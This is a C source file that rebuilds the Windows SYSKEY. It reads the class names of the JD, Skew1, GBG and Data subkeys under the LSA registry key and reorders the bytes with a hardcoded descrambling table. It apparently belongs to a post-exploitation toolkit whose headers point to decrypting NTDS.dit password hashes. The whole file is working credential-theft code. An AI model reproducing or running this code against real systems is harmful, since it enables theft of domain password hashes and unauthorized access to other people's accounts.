/*!
* @file syskey.c
* @brief Definitions for functions to retrieve the SYSKEY from the Registry
*/
#include "extapi.h"

#define JET_VERSION 0x0501

#include <inttypes.h>
#include <WinCrypt.h>
#include "syskey.h"
#include "ntds_decrypt.h"
#include "ntds_jet.h"
#include "ntds.h"

/*!
* @brief Get individual component of the SysKey from the Registry.
* @param lsaHandle Handle to the LSA Registry Key
* @param subkeyName String containing the name of the Subkey to read from.
* @param tmpSysKey Pointer to the string of the Syskey we are building
* @returns Indication of sucess or failure.
*/
BOOL get_syskey_component(HKEY lsaHandle, char subkeyName[255], unsigned char *tmpSysKey)
{
	DWORD sizeData = 9;
	long regStatus;
	HKEY subkeyHandle;
	unsigned char tmpVal[16];
	intmax_t byteComponent = 0;

	regStatus = RegOpenKeyEx(lsaHandle, subkeyName, 0, KEY_READ, &subkeyHandle);
	if (regStatus != ERROR_SUCCESS) {
		return FALSE;
	}
	regStatus = RegQueryInfoKey(subkeyHandle, (LPSTR)&tmpVal, &sizeData, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (regStatus != ERROR_SUCCESS) {
		return FALSE;
	}
	byteComponent = strtoimax(tmpVal, NULL, 16);
	strncat_s(tmpSysKey, 17, (char *)&byteComponent, 4);
	RegCloseKey(subkeyHandle);
	return TRUE;
}

/*!
* @brief Retrieves and assembled the SYSKEY from the Registry
* @param sysKey Pointer to the string of the Syskey we are building
* @returns Indication of sucess or failure.
*/
BOOL get_syskey(unsigned char *sysKey)
{
	unsigned char tmpSysKey[17];
	unsigned char interimSysKey[17];
	long regStatus;
	DWORD disposition = 0;
	HKEY lsaHandle;
	memset(&tmpSysKey, 0, sizeof(tmpSysKey));
	memset(&interimSysKey, 0, sizeof(tmpSysKey));

	//Used for descrambling the bytes of the SYSKEY (absurd isn't it?)
	BYTE syskeyDescrambler[16] = { 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 };

	regStatus = RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Lsa", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_READ, NULL, &lsaHandle, &disposition);
	if (regStatus != ERROR_SUCCESS) {
		return FALSE;
	}
	if (disposition == REG_CREATED_NEW_KEY) {
		RegCloseKey(lsaHandle);
		return FALSE;
	}
	if (!get_syskey_component(lsaHandle, "JD", tmpSysKey)) {
		return FALSE;
	}
	if (!get_syskey_component(lsaHandle, "Skew1", tmpSysKey)) {
		return FALSE;
	}
	if (!get_syskey_component(lsaHandle, "GBG", tmpSysKey)) {
		return FALSE;
	}
	if (!get_syskey_component(lsaHandle, "Data", tmpSysKey)) {
		return FALSE;
	}

	for (int i = 0; i < 16; i++) {
		interimSysKey[i] = tmpSysKey[syskeyDescrambler[i]];
	}
	strncpy_s(sysKey, 17, interimSysKey, 16);
	RegCloseKey(lsaHandle);
	return TRUE;
}
